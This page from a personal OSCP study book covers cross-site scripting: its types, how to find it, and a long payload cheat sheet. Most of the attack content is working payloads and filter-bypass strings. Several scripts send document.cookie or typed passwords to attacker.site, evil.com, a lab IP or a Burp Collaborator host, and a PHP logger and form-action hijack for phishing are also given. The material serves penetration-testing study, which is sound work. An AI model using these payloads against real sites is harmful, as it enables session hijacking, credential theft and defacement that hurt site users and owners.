<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>XSS_More - Brandon&#x27;s OSCP Notes</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">2.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">2.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">2.3.</strong> File Transfer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="AddnlFileTrasnfer.html"><strong aria-hidden="true">2.3.1.</strong> Additional File Transfer</a></li></ol></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">2.4.</strong> Ports</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="SSHKeys.html"><strong aria-hidden="true">2.4.1.</strong> SSH Keys</a></li></ol></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">2.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">3.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Impacket.html"><strong aria-hidden="true">3.2.</strong> Impacket</a></li><li class="chapter-item expanded "><a href="RDPEXploit.html"><strong aria-hidden="true">3.3.</strong> RDP Exploits</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">3.4.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">3.5.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">3.5.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">3.5.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">3.6.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="CMSs.html"><strong aria-hidden="true">3.7.</strong> CMSs</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">3.8.</strong> File Uploads</a></li><li class="chapter-item expanded "><a href="AddnlFileUpload.html"><strong aria-hidden="true">3.9.</strong> Additional File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">3.9.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">3.9.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">3.9.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">3.10.</strong> LFI/RFI</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="LFIRFIMore.html"><strong aria-hidden="true">3.10.1.</strong> LFIRFI_More</a></li></ol></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">3.11.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">3.12.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">3.13.</strong> SQL</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="MoreSQL.html"><strong aria-hidden="true">3.13.1.</strong> More SQL</a></li><li class="chapter-item expanded "><a href="PSQL.html"><strong aria-hidden="true">3.13.2.</strong> PSQL</a></li><li class="chapter-item expanded "><a href="MyMySql.html"><strong aria-hidden="true">3.13.3.</strong> MySQL</a></li><li class="chapter-item expanded "><a href="MSSQL.html"><strong aria-hidden="true">3.13.4.</strong> MSSQL</a></li></ol></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">3.14.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">3.15.</strong> XXE_XSS_Deserialization</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="XXMore.html" class="active"><strong aria-hidden="true">3.15.1.</strong> XSS_More</a></li><li class="chapter-item expanded "><a href="XXXEMore.html"><strong aria-hidden="true">3.15.2.</strong> XXE More</a></li><li class="chapter-item expanded "><a href="CSRF.html"><strong aria-hidden="true">3.15.3.</strong> CSRF</a></li><li class="chapter-item expanded "><a href="SSRF.html"><strong aria-hidden="true">3.15.4.</strong> SSRF</a></li></ol></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">3.16.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENLinNotes.html"><strong aria-hidden="true">4.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">5.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">5.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENWinNotes.html"><strong aria-hidden="true">5.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="KerberosCheetSheet.html"><strong aria-hidden="true">6.1.</strong> Kerberos Cheat Sheet</a></li><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">6.2.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">6.3.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">6.4.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">6.5.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">6.6.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">6.7.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">6.8.</strong> Persistence</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="cross-site-scripting"><a class="header" href="#cross-site-scripting">Cross-site Scripting</a></h1>
<p>Introduction</p>
<p>XSS happens when the user input is given as output without sanitization on input and output.</p>
<ul>
<li>Find the blacklisted/filtered characters. You can use XSS locators for this:</li>
</ul>
<pre><code class="language-none">'';! - "&lt;XSS&gt;=&amp;{()}
</code></pre>
<p>Goals of XSS:</p>
<ol>
<li>
<p>Cookie stealing</p>
</li>
<li>
<p>Complete control on browser</p>
</li>
<li>
<p>Initiating an exploitation phase against browser plugins first and and the machine</p>
</li>
<li>
<p>Keylogging</p>
</li>
</ol>
<p>3 types:</p>
<ol>
<li>
<p>Reflected (Server side code is vulnerable)</p>
</li>
<li>
<p>Stored</p>
</li>
<li>
<p>DOM (Client side code is vulnerable)</p>
</li>
</ol>
<p>Reflected XSS</p>
<p>Victims bring the payload in the HTTP request to the vulnerable website. Then the browser renders the payload in the victim's context.</p>
<p><code>https://insecure-website.com/search?term=gift</code></p>
<p>The application echoes the supplied search term in the response to this URL:</p>
<p>You searched for: gift</p>
<pre><code>https://insecure-website.com/status?message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;
</code></pre>
<p>Persistent XSS</p>
<p>Persistent XSS is able to deface a webpage.</p>
<p>This type of attack does not need the victims to click on any links. It happens when a victim browses a vulnerable page injected with persistent XSS code.</p>
<p>Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:</p>
<pre><code>POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net
</code></pre>
<p>url encoded with xss:</p>
<pre><code>comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
</code></pre>
<p>DOM-based XSS</p>
<p>Make use of the HTML tree.</p>
<p>The document.write sink works with script elements, so you can use a simple payload such as:</p>
<pre><code>document.write('... &lt;script&gt;alert(document.domain)&lt;/script&gt; ...');
</code></pre>
<p>The innerHTML sink doesn’t accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:</p>
<pre><code>element.innerHTML='... &lt;img src=1 onerror=alert(document.domain)&gt; ...'
</code></pre>
<p>Find XSS</p>
<p>Input could be:</p>
<ol>
<li>
<p>GET/POST variables</p>
</li>
<li>
<p>COOKIE</p>
</li>
<li>
<p>HTTP HEADERS</p>
</li>
</ol>
<p>First, try to inject <code>&lt;plaintext&gt;</code> tag to see if the page will be broken after.</p>
<p>Then, check if we can inject script using <code>&lt;script&gt;</code> or using one of the DOM events (e.g. <code>&lt;h1&gt;</code>).</p>
<p>When inspecting the source code, look for all the points where the application outputs data (totally / partially) supplied by the user without sanitization and tracking it back to the source where it is retrieved for the first time.</p>
<h3 id="xss-between-html-tags"><a class="header" href="#xss-between-html-tags">XSS between html tags</a></h3>
<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;img src=1 onerror=alert(1)&gt;
</code></pre>
<h3 id="xss-in-html-tag-attributes"><a class="header" href="#xss-in-html-tag-attributes">xss in html tag attributes</a></h3>
<p>When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:</p>
<pre><code>"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
</code></pre>
<p>More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:</p>
<pre><code>" autofocus onfocus=alert(document.domain) x="
</code></pre>
<pre><code>&lt;a href="javascript:alert(document.domain)"&gt;
</code></pre>
<h3 id="xss-in-javascript"><a class="header" href="#xss-in-javascript">xss in javascript</a></h3>
<p><strong>Terminating the existing script</strong> In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:</p>
<pre><code>&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;
</code></pre>
<p><strong>Breaking out of a JavaScript string</strong></p>
<pre><code>'-alert(document.domain)-'
';alert(document.domain)//
</code></pre>
<p><strong>Making use of HTML-encoding</strong></p>
<p>When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters. For example, if the XSS context is as follows:</p>
<pre><code>&lt;a href="#" onclick="... var input='controllable data here'; ..."&gt;
</code></pre>
<p>and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:</p>
<pre><code>&amp;apos;-alert(document.domain)-&amp;apos;
</code></pre>
<p>The ' sequence is an HTML entity representing an apostrophe or single quote</p>
<p><strong>XSS in JavaScript template literals</strong> JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${…} syntax.</p>
<p>For example, the following script will print a welcome message that includes the user’s display name:</p>
<p>document.getElementById(‘message’).innerText = <code>Welcome, ${user.displayName}.</code>;</p>
<p>When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${…} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:</p>
<pre><code>&lt;script&gt;
...
var input = `controllable data here`;
...
&lt;/script&gt;
</code></pre>
<p>then you can use the following payload to execute JavaScript without terminating the template literal:</p>
<pre><code>${alert(document.domain)}
</code></pre>
<p>XSS tricks</p>
<p>Simple: <code>&lt;script&gt;alert('xss')&lt;/script&gt;</code> IMG tag onload: <code>&lt;img src="xxx" onload="javascript:alert('xss')"&gt;</code> <code>&lt;img src="xxx" onload="alert('xss')"&gt;</code> <code>&lt;img src="xxx" onload="alert(String.fromCharCode(88,83,83))"&gt;</code></p>
<p>XSS Exploit</p>
<p>Cookie Stealing</p>
<ol>
<li>
<p>Find injection point</p>
</li>
<li>
<p>Read the cookie using JS</p>
</li>
<li>
<p>Redirect the cookie to attacker server</p>
</li>
<li>
<p>Retrieve and install the stolen cookie on browser</p>
</li>
</ol>
<p>Example:</p>
<pre><code>&lt;script&gt;
var i = new Image(); 
i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
&lt;/script&gt;
</code></pre>
<p>Note <code>%2b</code> = <code>+</code></p>
<p>The <code>steal.php</code> could be:</p>
<pre><code>$fn = "log.txt";
$fh = fopen($fn, 'a');
$cookie = $_GET['q'];
fwrite($fh, $cookie);
fclose($fh)
</code></pre>
<p>We can also do some other thing, for example, change <code>form action</code> location:</p>
<pre><code>document.forms[0].action="http://attacker.site/steal.php";
</code></pre>
<h2 id="steal-cookies"><a class="header" href="#steal-cookies">steal cookies</a></h2>
<pre><code>&lt;script&gt;
new Image().src="http://192.168.30.5:81/bogus.php?ouput="+document.cookie;
&lt;/script&gt;
</code></pre>
<pre><code>&lt;script&gt;
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;
</code></pre>
<h2 id="capture-passwords"><a class="header" href="#capture-passwords">capture passwords</a></h2>
<pre><code>&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;
</code></pre>
<p>Web Defacement</p>
<ul>
<li>
<p>Make use of Persistent XSS</p>
</li>
<li>
<p>Change the appearance of the web by manipulating the DOM</p>
</li>
</ul>
<pre><code>document.body.innerHTML="&lt;h1&gt;What!&lt;/h1&gt;";
</code></pre>
<p>Phishing</p>
<ul>
<li>By modifying the form action's destination</li>
</ul>
<pre><code>document.forms[0].action="https://hacker.site/thanks.php";
</code></pre>
<hr />
<h3 id="top-xss-payloads"><a class="header" href="#top-xss-payloads">Top XSS Payloads</a></h3>
<p>1-<code>&lt;script&gt;alert("1")&lt;/script&gt;</code></p>
<p>2-<code>&lt;sCript&gt; alert("bypassing simple filters") &lt;/sCRIpt&gt;</code></p>
<p>3-<code>&lt;a onmouseover="alert(document.cookie)"&gt;xxs link&lt;/a&gt; | &lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</code></p>
<p>4-<code>&lt;img src='zzzz' onerror='alert(1)' /&gt;</code></p>
<p>5-<code>&lt;div style="color:red" onclick=alert('xss')&gt;</code>| Coloring is adding to see the div</p>
<p>6-<code>&lt;div style="color:green" onmouseover=alert('xss') &gt;</code></p>
<p>7-<code>&lt;script&gt;console.log("test")&lt;/script&gt;</code> <strong>Testing if the word "alert" is allowed in the script</strong></p>
<p>8- <code>&lt;img src="cc" onerror=eval(String'fromCharCode')&gt;</code> |<strong>alert is not allowed</strong></p>
<p>9-<code>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code>|<strong>escaping script tags to excute the payload</strong></p>
<p>10-<code>';alert('xss');//</code>| The apostrophe character is used to escape in PHP htmlentities**'**</p>
<p>11-<code>' onerror=alert('xss');&gt;</code> | use this if the vulnerability in the image</p>
<p>12-<code>#&lt;script&gt;alert(1)&lt;/script&gt;</code> | <strong>exploiting the DOM xss with hash.substring</strong></p>
<p>13-<code>#javascript:alert(1)</code> | <strong>exploiting the DOM xss with hash.substring</strong></p>
<p>14-<code>" onmouseover="alert(1)</code> |</p>
<p>15-<code>&lt;script&gt; var i = new Image(); i.src="http://URL/get.php?cookie="+escape(document.cookie)&lt;/script&gt;</code>|<strong>to get cookie</strong></p>
<p>16-<code>“&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;</code>|<strong>to get cookie</strong></p>
<p>17-<code>“&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;</code></p>
<p>18-<code>“%3e%3cscript%3ealert(document.cookie)%3c/script%3e</code></p>
<p>19-<code>“&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
<p>20-<code>%00“&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p>21-<code>&lt;object data=”data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;”&gt;</code></p>
<p>22-<code>&lt;object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;</code></p>
<p>23-<code>&lt;a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;</code></p>
<p>24-<code>Click here&lt;/a&gt;</code></p>
<p>25-<code>&lt;img o[%00]nerror=alert(1) src=a&gt;</code>| to bypass attribute filters</p>
<p>26-<code>&lt;img onerror=”alert(1)”src=a&gt;</code>| attribute delimiter</p>
<p>27-<code>&lt;img onerror=’alert(1)’src=a&gt;</code>| attribute delimiter</p>
<p>28-<code>&lt;img onerror=</code>alert(1)<code>src=a&gt;</code>| attribute delimiter</p>
<p>29-<code>&lt;img onerror=a[%00]lert(1) src=a&gt;</code>| attribute value</p>
<p>30-<code>&lt;img onerror=a&amp;#x6c;ert(1) src=a&gt;</code>| attribute value</p>
<p>31- <code>&lt;img src='nevermind' onerror="alert('XSS');" /&gt;</code> <strong>| DOM</strong></p>
<hr />
<h2 id="cross-site-scripting-xss-cheatsheet"><a class="header" href="#cross-site-scripting-xss-cheatsheet">Cross-Site Scripting (XSS) Cheatsheet</a></h2>
<pre><code class="language-none">--------------------------------------------------------------------
XSS Locators:
'';!--"&lt;XSS&gt;=&amp;{()}
--------------------------------------------------------------------
Classic Payloads:
&lt;svg onload=alert(1)&gt;
"&gt;&lt;svg onload=alert(1)&gt;
&lt;iframe src="javascript:alert(1)"&gt;
"&gt;&lt;script src=data:&amp;comma;alert(1)//
--------------------------------------------------------------------
script tag filter bypass:
&lt;svg/onload=alert(1)&gt;
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;script     &gt;alert(1)&lt;/script&gt;
&lt;ScRipT&gt;alert(1)&lt;/sCriPt&gt;
&lt;%00script&gt;alert(1)&lt;/script&gt;
&lt;script&gt;al%00ert(1)&lt;/script&gt;
--------------------------------------------------------------------
HTML tags:
&lt;img/src=x a='' onerror=alert(1)&gt;
&lt;IMG """&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;"&gt;
&lt;img src=`x`onerror=alert(1)&gt;
&lt;img src='/' onerror='alert("kalisa")'&gt;
&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
&lt;IMG onmouseover="alert('xxs')"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
&lt;SCRIPT SRC=http:/evil.com/xss.js?&lt; B &gt;
"&gt;&lt;XSS&lt;test accesskey=x onclick=alert(1)//test
&lt;svg&gt;&lt;discard onbegin=alert(1)&gt;
&lt;script&gt;image = new Image(); image.src="https://evil.com/?c="+document.cookie;&lt;/script&gt;
&lt;script&gt;image = new Image(); image.src="http://"+document.cookie+"evil.com/";&lt;/script&gt;
--------------------------------------------------------------------
Other tags:
&lt;BASE HREF="javascript:alert('XSS');//"&gt;
&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
&lt;xss id=x tabindex=1 onactivate=alert(1)&gt;&lt;/xss&gt;
&lt;xss onclick="alert(1)"&gt;test&lt;/xss&gt;
&lt;xss onmousedown="alert(1)"&gt;test&lt;/xss&gt;
&lt;body onresize=alert(1)&gt;”onload=this.style.width=‘100px’&gt;
&lt;xss id=x onfocus=alert(document.cookie)tabindex=1&gt;#x’;&lt;/script&gt;
--------------------------------------------------------------------CharCode:
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
--------------------------------------------------------------------
if the input is already in script tag:
@domain.com"&gt;user+'-alert`1`-'@domain.com
--------------------------------------------------------------------AngularJS: 




toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
--------------------------------------------------------------------
Scriptless:
&lt;link rel=icon href="//evil?
&lt;iframe src="//evil?
&lt;iframe src="//evil?
&lt;input type=hidden type=image src="//evil?
--------------------------------------------------------------------
Unclosed Tags:
&lt;svg onload=alert(1)//
--------------------------------------------------------------------
DOM XSS:
“&gt;&lt;svg onload=alert(1)&gt;
&lt;img src=1 onerror=alert(1)&gt;
javascript:alert(document.cookie)
\“-alert(1)}//
&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;
--------------------------------------------------------------------
Another case:
param=abc`;return+false});});alert`xss`;&lt;/script&gt;
abc`; Finish the string
return+false}); Finish the jQuery click function
}); Finish the jQuery ready function
alert`xss`; Here we can execute our code
&lt;/script&gt; This closes the script tag to prevent JavaScript parsing errors
--------------------------------------------------------------------
</code></pre>
<h4 id="restrictions-bypass"><a class="header" href="#restrictions-bypass">Restrictions Bypass</a></h4>
<pre><code class="language-none">--------------------------------------------------------------------
No parentheses:
&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;
&lt;script&gt;throw onerror=eval,'=alert\x281\x29'&lt;/script&gt;
&lt;script&gt;'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}&lt;/script&gt;
&lt;script&gt;location='javascript:alert\x281\x29'&lt;/script&gt;
&lt;script&gt;alert`1`&lt;/script&gt;
&lt;script&gt;new Function`X${document.location.hash.substr`1`}`&lt;/script&gt;
--------------------------------------------------------------------
No parentheses and no semicolons:
&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;
&lt;script&gt;throw onerror=alert,1&lt;/script&gt;
&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;
&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;
&lt;script&gt;throw onerror=alert,'some string',123,'haha'&lt;/script&gt;
--------------------------------------------------------------------
No parentheses and no spaces:
&lt;script&gt;Function`X${document.location.hash.substr`1`}```&lt;/script&gt;
--------------------------------------------------------------------
Angle brackets HTML encoded (in an attribute):
“onmouseover=“alert(1)
‘-alert(1)-’
--------------------------------------------------------------------
If quote is escaped:
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//
--------------------------------------------------------------------
Embedded tab, newline, carriage return to break up XSS:
&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
--------------------------------------------------------------------
Other:
&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;: base64 value which is alert(‘XSS’)
--------------------------------------------------------------------
</code></pre>
